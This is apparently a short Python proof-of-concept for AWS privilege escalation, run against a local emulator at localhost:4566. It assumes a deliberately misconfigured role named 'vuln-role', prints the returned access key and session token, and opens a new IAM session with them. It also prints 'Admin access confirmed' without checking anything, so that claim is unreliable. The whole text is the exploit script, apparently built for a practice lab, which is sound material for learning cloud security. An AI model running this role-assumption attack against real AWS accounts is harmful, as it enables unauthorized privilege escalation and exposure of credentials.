#!/usr/bin/env python3
import boto3

sts = boto3.client('sts', endpoint_url='http://localhost:4566')

response = sts.assume_role(
    RoleArn='arn:aws:iam::123456789012:role/vuln-role',
    RoleSessionName='privesc-session'
)

creds = response['Credentials']
print("[+] Successfully assumed vuln-role!")
print(f"    AccessKeyId: {creds['AccessKeyId']}")
print(f"    SessionToken: {creds['SessionToken']}")

# Use new creds
new_session = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['SessionToken']
)
iam = new_session.client('iam', endpoint_url='http://localhost:4566')
print("[+] Admin access confirmed")
